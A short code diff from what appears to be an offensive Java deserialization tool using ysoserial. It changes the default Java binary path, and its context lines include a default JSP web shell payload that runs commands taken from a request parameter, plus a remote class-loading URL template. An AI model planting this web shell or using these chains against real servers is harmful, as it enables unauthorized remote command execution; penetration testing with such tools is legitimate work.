@@ -102,7 +102,7 @@ if __name__ == '__main__':
 
     # java specific
     ysoserial_group = parser.add_argument_group('ysoserial')
-    ysoserial_group.add_argument('--java-path', help="Full path to java bin", default="java")
+    ysoserial_group.add_argument('--java-path', help="Full path to java bin", default="./jre1.8.0_431/bin/java")
     ysoserial_group.add_argument('--ysoserial-path', help="Full path to ysoserial jar", default="ysoserial-all.jar")
     ysoserial_group.add_argument('--jsp-code', help="JSP Code or path to a file used for 'File Write' type chains (ex: exploit.jsp)", default="<% Runtime.getRuntime().exec(request.getParameter(\"c\")) %> %%chain_id%%")
     ysoserial_group.add_argument('--java-remote-class-url', help="URL of the webserver serving a java class for remote dynamic loading. Use it with --java-classname", default="https://%%domain%%/%%chain_id%%")
